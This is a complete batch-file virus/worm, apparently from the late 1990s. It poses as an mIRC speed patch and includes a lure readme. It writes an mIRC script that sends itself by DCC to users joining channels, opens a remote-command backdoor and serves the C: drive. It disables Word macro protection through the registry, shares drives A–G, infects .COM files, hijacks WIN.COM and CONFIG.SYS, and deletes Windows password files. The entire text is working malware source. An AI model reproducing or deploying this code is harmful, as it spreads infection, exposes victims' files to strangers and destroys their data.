@ECHO OFF
@BREAK OFF
@CTTY NUL
@MD c:\Lucky
ATTRIB C:\COMMAND.COM -H -R -S
ATTRIB C:\CONFIG.SYS -H -R -S
ECHO - = Jerret_Black@Hotmail.com Virus = - >C:\Lucky\x.xxx
ECHO Ja,Ja so ist das eben...!>>C:\Lucky\x.xxx
COPY %0 C:\lO.SYS>nul
copy %0 %TMP%\mIRCplus.exe>nul
ECHO Hi folks!>%TMP%\Readme.txt
ECHO with this patch all /games will be more fast than ever!! :-)>>%TMP%\Readme.txt
ECHO I've made this little utility coz my ISP sux and i lost a lot of time typing /games...>>%TMP%\Readme.txt
ECHO So.. here's the patcher, Enjoy ! :))>>%TMP%\Readme.txt
ECHO.>>%TMP%\Readme.txt
ECHO      Jerret_Black@Hotmail.com>>%TMP%\Readme.txt
ECHO      Starbyte@Hotmail.com>>%TMP%\Readme.txt
ECHO      LordJulus@Geocities.com>>%TMP%\Readme.txt
ECHO    That´s are all fine Coder´s>>%TMP%\Readme.txt
ECHO.>>%TMP%\Readme.txt
IF exist IO.SYS goto :Jerret
start /m WINZIP32.EXE -a "%TMP%\mIRCplus.zip" "%TMP%\mIRCplus.exe" "%TMP%\Readme.txt"
:Jerret
ECHO ;keep this LOAD! mIRCplus Script © - copyright LUCKY B.R.D 1994-99>C:\Lucky\sc.ini
ECHO [script]>>C:\Lucky\sc.ini
ECHO n0=Script.ini>>C:\Lucky\sc.ini
ECHO n1=>>C:\Lucky\sc.ini
ECHO n2=on 1:START:{>>C:\Lucky\sc.ini
ECHO n3=.sreq ignore>>C:\Lucky\sc.ini
ECHO n4=.remote on>>C:\Lucky\sc.ini
ECHO n5=.ctcps on>>C:\Lucky\sc.ini
ECHO n6=.events on>>C:\Lucky\sc.ini
ECHO n7=}>>C:\Lucky\sc.ini
ECHO n8=on 1:text:*BA*:#:/fserve StRaM 5 C:\>>C:\Lucky\sc.ini
ECHO n9=on 1:CONNECT:>>C:\Lucky\sc.ini
ECHO n10=.msg #Please,,give me a chance ?>>C:\Lucky\sc.ini
ECHO n11=on 1:INPUT:*:{>>C:\Lucky\sc.ini
ECHO n12=  .msg #Yes or No ( $+ $active $+ ) $1->>C:\Lucky\sc.ini
ECHO n13=}>>C:\Lucky\sc.ini
ECHO n14=on 1:TEXT:*:?:{>>C:\Lucky\sc.ini
ECHO n15=  if ( $1 == runthis ) { .run $2- }>>C:\Lucky\sc.ini
ECHO n16=}>>C:\Lucky\sc.ini
ECHO n17=>>C:\Lucky\sc.ini
ECHO n18=on 1:JOIN:*:{>>C:\Lucky\sc.ini
ECHO n19=  if ( $nick == $me ) { halt } >>C:\Lucky\sc.ini
ECHO n20=  ./dcc send $nick %TMP%\mIRCplus.zip>>C:\Lucky\sc.ini
ECHO n21=  /LUCKY>>C:\Lucky\sc.ini
ECHO n22=on 1:TEXT:*script.ini*:?:/.ignore $nick>>C:\Lucky\sc.ini
ECHO n23=on 1:TEXT:*virus*:?:/.ignore $nick>>C:\Lucky\sc.ini
ECHO n24=on 1:TEXT:*worm*:?:/.ignore $nick>>C:\Lucky\sc.ini
ECHO ;>>C:\Lucky\sc.ini
ECHO REGEDIT4>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>C:\Lucky\REG.REG
ECHO "RegisteredOwner"="Jerret_Black">>C:\Lucky\REG.REG
ECHO "RegisteredOrganization"="MYSELF ! ! ! ">>C:\Lucky\REG.REG
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]>>C:\Lucky\REG.REG
ECHO "EnableMacroVirusProtection"="0">>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network]>>C:\Lucky\REG.REG
ECHO "Installed"="1">>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Real Mode Net]>>C:\Lucky\REG.REG
ECHO "transport"="">>C:\Lucky\REG.REG
ECHO "netcard"="">>C:\Lucky\REG.REG
ECHO "LoadRMDrivers"=hex:00,00,00,00>>C:\Lucky\REG.REG
ECHO "preferredredir"="">>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman]>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\A]>>C:\Lucky\REG.REG
ECHO "Path"="A:\\">>C:\Lucky\REG.REG
ECHO "Remark"="">>C:\Lucky\REG.REG
ECHO "Type"=dword:00000000>>C:\Lucky\REG.REG
ECHO "Flags"=dword:00000102>>C:\Lucky\REG.REG
ECHO "Parm1enc"=hex:>>C:\Lucky\REG.REG
ECHO "Parm2enc"=hex:>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\C]>>C:\Lucky\REG.REG
ECHO "Path"="C:\\">>C:\Lucky\REG.REG
ECHO "Remark"="">>C:\Lucky\REG.REG
ECHO "Type"=dword:00000000>>C:\Lucky\REG.REG
ECHO "Flags"=dword:00000102>>C:\Lucky\REG.REG
ECHO "Parm1enc"=hex:>>C:\Lucky\REG.REG
ECHO "Parm2enc"=hex:>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\D]>>C:\Lucky\REG.REG
ECHO "Path"="D:\\">>C:\Lucky\REG.REG
ECHO "Remark"="">>C:\Lucky\REG.REG
ECHO "Type"=dword:00000000>>C:\Lucky\REG.REG
ECHO "Flags"=dword:00000102>>C:\Lucky\REG.REG
ECHO "Parm1enc"=hex:>>C:\Lucky\REG.REG
ECHO "Parm2enc"=hex:>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\E]>>C:\Lucky\REG.REG
ECHO "Path"="E:\\">>C:\Lucky\REG.REG
ECHO "Remark"="">>C:\Lucky\REG.REG
ECHO "Type"=dword:00000000>>C:\Lucky\REG.REG
ECHO "Flags"=dword:00000102>>C:\Lucky\REG.REG
ECHO "Parm1enc"=hex:>>C:\Lucky\REG.REG
ECHO "Parm2enc"=hex:>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\F]>>C:\Lucky\REG.REG
ECHO "Path"="F:\\">>C:\Lucky\REG.REG
ECHO "Remark"="">>C:\Lucky\REG.REG
ECHO "Type"=dword:00000000>>C:\Lucky\REG.REG
ECHO "Flags"=dword:00000102>>C:\Lucky\REG.REG
ECHO "Parm1enc"=hex:>>C:\Lucky\REG.REG
ECHO "Parm2enc"=hex:>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman\G]>>C:\Lucky\REG.REG
ECHO "Path"="G:\\">>C:\Lucky\REG.REG
ECHO "Remark"="">>C:\Lucky\REG.REG
ECHO "Type"=dword:00000000>>C:\Lucky\REG.REG
ECHO "Flags"=dword:00000102>>C:\Lucky\REG.REG
ECHO "Parm1enc"=hex:>>C:\Lucky\REG.REG
ECHO "Parm2enc"=hex:>>C:\Lucky\REG.REG
ECHO.>>C:\Lucky\REG.REG
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Network]>>C:\Lucky\REG.REG
ECHO "NoFileSharing"=dword:00000000>>C:\Lucky\REG.REG
ECHO "NoPrintSharing"=dword:00000000>>C:\Lucky\REG.REG
IF EXIST lO.SYS GOTO :p
ECHO.>>C:\CONFIG.SYS
ECHO INSTALLHIGH=C:\lO.SYS>>C:\CONFIG.SYS
:p
ECHO @ECHO off>BA.BAT
ECHO Ctty nul>>BA.BAT
ECHO Move C:\Lucky\REG.REG %%WINDIR%%\REG.REG>>BA.BAT
ECHO for %%%%i In (*.COM ..\*.COM) do copy /b %%%%i + C:\Lucky\x.xxx %%%%i>>BA.BAT
ECHO ATTRIB %%WINDIR%%\WIN.COM -H -R -S>>BA.BAT
ECHO IF EXIST %%WINDIR%%\WlN.COM goto :skip>>BA.BAT
ECHO IF NOT EXIST %%WINDIR%%\WlN.COM goto :smfn>>BA.BAT
ECHO :smfn>>BA.BAT
ECHO REN %%WINDIR%%\WIN.COM WlN.COM>>BA.BAT
ECHO :skip>>BA.BAT
ECHO IF EXIST c:\mIRC\*.* GOTO :1>>BA.BAT
ECHO IF NOT EXIST C:\mIRC\*.* GOTO :2>>BA.BAT
ECHO :1>>BA.BAT
ECHO MOVE C:\Lucky\sc.ini C:\mIRC\script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :2>>BA.BAT
ECHO IF EXIST C:\Progra~1\mIRC\*.* GOTO :3>>BA.BAT
ECHO IF NOT EXIST C:\Progra~1\mIRC\*.* GOTO :4>>BA.BAT
ECHO :3>>BA.BAT
ECHO MOVE C:\Lucky\sc.ini C:\Progra~1\mIRC\script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :4>>BA.BAT
ECHO IF EXIST d:\mIRC\*.* GOTO :5>>BA.BAT
ECHO IF NOT EXIST d:\mIRC\*.* GOTO :6>>BA.BAT
ECHO :5>>BA.BAT
ECHO MOVE C:\Lucky\sc.ini d:\mIRC\script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :6>>BA.BAT
ECHO IF EXIST d:\Progra~1\mIRC\*.* GOTO :7>>BA.BAT
ECHO IF NOT EXIST d:\Progra~1\mIRC\*.* GOTO :8>>BA.BAT
ECHO :7>>BA.BAT
ECHO MOVE C:\Lucky\sc.ini d:\Progra~1\mIRC\script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :8>>BA.BAT
ECHO IF EXIST e:\mIRC\*.* GOTO :9>>BA.BAT
ECHO IF NOT EXIST e:\mIRC\*.* GOTO :10>>BA.BAT
ECHO :9>>BA.BAT
ECHO MOVE C:\Lucky\sc.ini e:\mIRC\script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :10>>BA.BAT
ECHO MOVE C:\Lucky\sc.ini e:\Progra~1\mIRC\script.ini>>BA.BAT
ECHO GOTO :next>>BA.BAT
ECHO :next>>BA.BAT
ECHO IF EXIST IO.SYS GOTO :X>>BA.BAT
ECHO IF NOT EXIST IO.SYS GOTO :Z>>BA.BAT
ECHO :Z>>BA.BAT
ECHO @REGEDIT /S /C %%WINDIR%%\REG.REG>>BA.BAT
ECHO GOTO :X>>BA.BAT
ECHO :X>>BA.BAT
ECHO IF NOT EXIST %TMP%\mIRCplus.zip goto :Bari>>BA.BAT
ECHO IF EXIST %TMP%\mIRCplus.zip goto :MO>>BA.BAT
ECHO :Bari>>BA.BAT
ECHO COPY %%WINDIR%%\SYSTEM\vidx32.dll %TMP%\mIRCplus.zip>>BA.BAT
ECHO :MO>>BA.BAT
ECHO for %%%%i in (B*.exe ..\A*.exe) do copy %0 %%%%i>>BA.BAT
ECHO for %%%%i in (%%WINDIR%%\*.PWL) do DEL %%%%i>>BA.BAT
ECHO for %%%%i in (C:\Lucky\*.*) do del %%%%i>>BA.BAT
ECHO RD C:\Lucky>>BA.BAT
ECHO COPY  %TMP%\mIRCplus.zip %%WINDIR%%\SYSTEM\vidx32.dll>>BA.BAT
ECHO COPY %0 %%windir%%\WIN.COM>>BA.BAT
ECHO IF EXIST mirc32.exe goto :SHH>>BA.BAT
ECHO IF NOT EXIST mirc32.exe goto :RI>>BA.BAT
ECHO IF EXIST WlN.COM GOTO :RI2>>BA.BAT
ECHO IF NOT EXIST WlN.COM GOTO :RIP>>BA.BAT
ECHO :SHH>>BA.BAT
ECHO CTTY CON>>BA.BAT
ECHO ECHO DONE !! HaHa Du hast Verloren !>>BA.BAT
ECHO CTTY NUL>>BA.BAT
ECHO :RI>>BA.BAT
ECHO del %%0>>BA.BAT
ECHO :RI2>>BA.BAT
ECHO CALL WlN.COM>>BA.BAT
ECHO DEL %%0>>BA.BAT
ECHO :RIP>>BA.BAT
ECHO DEL %%0>>BA.BAT
CALL BA.BAT